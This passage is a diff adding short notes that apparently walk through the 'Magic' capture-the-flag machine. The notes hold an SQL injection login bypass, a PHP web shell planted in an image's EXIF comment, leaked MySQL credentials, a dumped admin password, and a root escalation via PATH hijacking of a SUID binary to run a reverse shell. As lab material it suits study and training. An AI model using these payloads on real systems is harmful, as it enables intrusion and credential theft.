@@ -1,0 +1,38 @@
+SQL Injection used:
+
+username = admin' ORDER BY 1-- BkEK
+password=admin
+
+Upload any jpg,jpeg,png:
+
+TO any jpg add this:
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' img.jpg
+then mv img.jpg img.php.jpg
+
+mysql creds:
+
+private static $dbName = 'Magic' ;
+private static $dbHost = 'localhost' ;
+private static $dbUsername = 'theseus';
+private static $dbUserPassword = 'iamkingtheseus';
+
+Dump using mysqldump:
+
+--
+-- Dumping data for table `login`
+--
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+
+Theseus->root:
+
+binary with suid -> sysinfo
+
+strings on sysinfo shows part of the source code of the file
+sourcecode uses cat (/bin/cat)
+manipulate PATH env variable to use our custom made cat binary which contains a reverse shell.
